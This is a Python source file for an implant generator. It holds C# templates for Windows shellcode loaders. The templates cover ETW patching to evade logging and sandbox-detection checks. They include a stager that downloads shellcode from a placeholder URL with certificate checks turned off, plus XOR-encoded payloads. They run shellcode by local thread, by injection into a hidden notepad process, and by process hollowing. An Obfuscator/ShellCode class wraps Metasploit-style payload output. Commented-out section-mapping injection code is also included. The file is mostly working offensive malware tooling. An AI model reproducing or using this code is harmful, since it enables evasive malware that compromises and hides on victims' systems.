import base64
import subprocess

DLL_IMPORT = {
  "VirtualAlloc": "",
  "CreateThread": "",
  "WaitForSingleObject": "",
  "NtCreateSection":"",
  "NtMapViewOfSection":"",

}
ETW_FUNCS = """
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);

[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }
private static void PatchEtw(byte[] patch)
    {
        try
        {
            uint oldProtect;

            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

            VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, etwEventSend, patch.Length);
        }
        catch
        {
            Console.WriteLine("Error unhooking ETW");
        }
    }
"""

ARCH_DETECTION = """
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
"""

HEURISTICS_IMPORT = """
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

"""

HEURISTICS_CODE = """
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
    { return; }

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    { return; }
"""

URL_DL_CODE = """
	string url = "{STAGER_URL}";

       if (!is64Bit())
	    url = "{STAGER_URL}32";

	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.WebClient client = new System.Net.WebClient();
	byte[] shellcode = client.DownloadData(url);

"""

SC_XOR_DECODER = """
  byte[] shellcode = new byte[] {{ {xor_shellcode} }};
  for (int i = 0; i < shellcode.Length; i++)
  {{
    shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
  }}
"""

ETW_PATCH = "PatchEtw(getETWPayload());"


START_PROCESS_INJECT_IMPORT = """
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

"""

START_SHELLCODE_IMPORT = """
        private static UInt32 MEM_COMMIT = 0x3000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
"""
START_SHELLCODE = """
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
"""

START_PROCESS_INJECT = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Hidden;
          start.CreateNoWindow = true;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
            Process[] expProc = Process.GetProcessesByName("notepad");
            for (int i = 0; i < expProc.Length; i++) {
              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
              IntPtr outSize;
              WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
               proc.WaitForExit();
               // Retrieve the app's exit code
               exitCode = proc.ExitCode;
          }
"""

START_PROCESS_HOLLOW_IMPORT = """
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
                public IntPtr ExitStatus;
                public IntPtr PebAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniquePID;
                public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

"""

START_PROCESS_HOLLOW_CODE = """
      STARTUPINFO si = new STARTUPINFO();

      PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

      bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(procname), IntPtr.Zero,
              IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

      PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
      uint tmp = 0;
      IntPtr hProcess = pi.hProcess;

      ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
      IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
      byte[] addrBuf = new byte[IntPtr.Size];
      IntPtr nRead = IntPtr.Zero;

      ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

      IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

      byte[] data = new byte[0x200];
      ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

      uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

      uint opthdr = e_lfanew_offset + 0x28;

      uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

      IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
      WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
      ResumeThread(pi.hThread);
"""

### OTHER IMPORTS
## The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.

#        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
#        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
#
#        [DllImport("kernel32.dll")]
#        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
#
#        [DllImport("kernel32.dll")]
#        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

#        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
#        static extern UInt32 NtCreateSection(
#            ref IntPtr SectionHandle,
#            UInt32 DesiredAccess,
#            IntPtr ObjectAttributes,
#            ref UInt32 MaximumSize,
#            UInt32 SectionPageProtection,
#            UInt32 AllocationAttributes,
#            IntPtr FileHandle);
#
#        [DllImport("ntdll.dll", SetLastError=true)]
#        static extern uint NtMapViewOfSection(
#            IntPtr SectionHandle,
#            IntPtr ProcessHandle,
#            ref IntPtr BaseAddress,
#            UIntPtr ZeroBits,
#            UIntPtr CommitSize,
#            out ulong SectionOffset,
#            out uint ViewSize,
#            uint InheritDisposition,
#            uint AllocationType,
#            uint Win32Protect);
#
#        [DllImport("ntdll.dll", SetLastError=true)]
#        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
#
#        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
#        static extern int NtClose(IntPtr hObject);


class Obfuscator:
  def __init__(self, string, xor_key=b'\00'):
    self.raw = string
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_bytes(self):
    return bytes(self.encoded)

  def get_b64(self):
    return base64.b64encode(bytes(self.encoded))

  def get_hex_c(self):
    return ",".join("\\x%02x" % b for b in self.encoded)

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_hex_vba(self):
    return ",".join("%02d" % b for b in self.encoded)

  def get_key_csharp(self):
    return "".join("0x%02x" % b for b in self.key)


class ShellCode(Obfuscator):
  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0):
    self.raw = subprocess.check_output(msf_cmd, shell=True)
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

class Implant:
  def __init__(self, template, base_name):
    self.template = template
    self.base_name = base_name


  def compile(self):
    pass


# Other injection types
#          //  IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
#          //  Marshal.Copy(buf, 0, addr, buf.Length);
#          //  IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
#          //  WaitForSingleObject(hThread, 0xFFFFFFFF);
#
#
#          //SIZE_T size = 4096;
#          //LARGE_INTEGER sectionSize = {{ size }};
#          //HANDLE sectionHandle = NULL;
#          //PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
#          //
#          //// create a memory section
#          //NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
#          //
#          //// create a view of the memory section in the local process
#          //NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
#
#          //// create a view of the memory section in the target process
#          //HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, 1480);
#          //NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
#
#          //// copy shellcode to the local view, which will get reflected in the target process's mapped view
#          //memcpy(localSectionAddress, buf, sizeof(buf));
#          //
#          //HANDLE targetThreadHandle = NULL;
#          //RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
